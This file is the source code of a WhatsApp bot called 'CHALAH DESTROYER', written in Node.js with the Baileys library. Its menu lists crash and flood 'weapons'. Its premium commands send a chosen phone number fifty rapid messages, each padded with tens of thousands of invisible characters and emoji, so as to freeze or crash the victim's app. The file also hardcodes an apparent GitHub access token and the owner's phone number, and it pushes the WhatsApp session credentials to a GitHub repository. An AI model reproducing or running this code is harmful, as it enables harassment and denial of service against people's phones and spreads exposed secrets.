const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    fetchLatestBaileysVersion, 
    DisconnectReason 
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const fs = require("fs");
const axios = require("axios");

// --- ULTRA CONFIG ---
const ownerNumber = "94742271802"; 
const logoUrl = 'https://files.catbox.moe/07hh33.png'; 
const voiceUrl = 'https://files.catbox.moe/xk6low.mp4'; 
const GITHUB_TOKEN = "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"; 
const GITHUB_REPO = "btest2619-sudo/Database-Md"; 
const SESSION_BRANCH = "session-data";

let premiumUsers = [ownerNumber]; 

// --- GITHUB SYNC (Termux/Railway Support) ---
async function uploadToGitHub(filePath, content) {
    try {
        const url = `https://api.github.com/repos/${GITHUB_REPO}/contents/${filePath}`;
        let sha = null;
        try { 
            const ex = await axios.get(url, { headers: { 'Authorization': `token ${GITHUB_TOKEN}` }, params: { ref: SESSION_BRANCH } }); 
            sha = ex.data.sha; 
        } catch (e) {}
        await axios.put(url, { message: `Sync ${filePath}`, content: Buffer.from(content).toString('base64'), branch: SESSION_BRANCH, sha: sha || undefined }, { headers: { 'Authorization': `token ${GITHUB_TOKEN}` } });
    } catch (e) {}
}

async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const client = makeWASocket({
        auth: state,
        printQRInTerminal: true,
        logger: pino({ level: "silent" }),
        browser: ["CHALAH-DESTROYER", "Linux", "3.0"]
    });

    client.ev.on('connection.update', (u) => {
        if (u.connection === 'open') console.log("🔥 CHALAH DESTROYER V2 ONLINE!");
        if (u.connection === 'close') startBot();
    });

    client.ev.on("messages.upsert", async (chat) => {
        const m = chat.messages[0];
        if (!m.message || m.key.fromMe) return;
        const from = m.key.remoteJid;
        const sn = m.key.participant ? m.key.participant.split('@')[0] : from.split('@')[0];
        const isPrem = premiumUsers.includes(sn) || sn === ownerNumber;
        const body = m.message.conversation || m.message.extendedTextMessage?.text || "";
        const cmd = body.startsWith(".") ? body.slice(1).trim().split(" ")[0].toLowerCase() : "";
        const q = body.trim().split(" ").slice(1).join(" ");

        if (cmd === 'menu') {
            const menu = `
     ╭───〔 **${"CHALAH 404 V2".toUpperCase()}** 〕───┈⊷
     │ 👤 **USER:** @${sn}
     │ 👑 **RANK:** ${isPrem ? 'PREMIUM DESTROYER' : 'FREE USER'}
     ╰────────────────────────┈⊷

     ╭───〔 **🔴 FREE WEAPONS** 〕───┈⊷
     │ ☢️ .uicrash (Freeze UI)
     │ ☢️ .locbomb (Location Lag)
     │ ☢️ .pollbug (Poll Overload)
     │ ☢️ .textbomb (Char Flood)
     │ ☢️ .ping (System Check)
     │ ☢️ .alive (Bot Status)
     ╰────────────────────────┈⊷

     ╭───〔 **🔱 PREMIUM (DEADLY)** 〕───┈⊷
     │ 💀 .rip (DB-Overflow)
     │ 💀 .die (System Killer)
     │ 💀 .full (Storage Grave)
     │ 💀 .lag (Infinite Loop)
     │ 💀 .404 (Render Crash)
     │ 💀 .end (Status Killer)
     │ 💀 .hell (Fatal Exploit)
     ╰────────────────────────┈⊷

     ╭───〔 **⚙️ SYSTEM** 〕───┈⊷
     │ 🛠️ .premium [number]
     │ 🛠️ .owner (Contact Dev)
     ╰────────────────────────┈⊷
     _⚠️ POWERED BY CHALAH-SUDO_`;

            await client.sendMessage(from, { 
                image: { url: logoUrl }, 
                caption: menu, 
                mentions: [m.key.participant || from] 
            });
            await client.sendMessage(from, { audio: { url: voiceUrl }, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
        }

        // --- PREMIUM BUG SYSTEM (ULTRA POWER) ---
        if (['rip', 'die', 'full', 'lag', '404', 'end', 'hell'].includes(cmd)) {
            if (!isPrem) return m.reply("🚫 *ACCESS DENIED!* \nPremium membership needed for deadly weapons.");
            const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            if (!q) return m.reply("Target Number?");
            
            m.reply(`☣️ *INJECTING DEADLY PAYLOADS...* \nTarget: ${q}\nStrength: 100%`);

            for(let i=0; i<50; i++) { // Loop 50 දක්වා වැඩි කළා (Extra Lag)
                const deadlyMsg = "‌".repeat(40000) + "⚰️".repeat(10000) + "VOID-404".repeat(5000);
                await client.sendMessage(target, { text: deadlyMsg });
                await delay(50); // Delay එක අඩු කළා (Fast Attack)
            }
        }
    });

    client.ev.on("creds.update", async () => {
        await saveCreds();
        const files = fs.readdirSync('./session');
        for (const f of files) await uploadToGitHub(`session/${f}`, fs.readFileSync(`./session/${f}`, 'utf-8'));
    });
}
startBot();
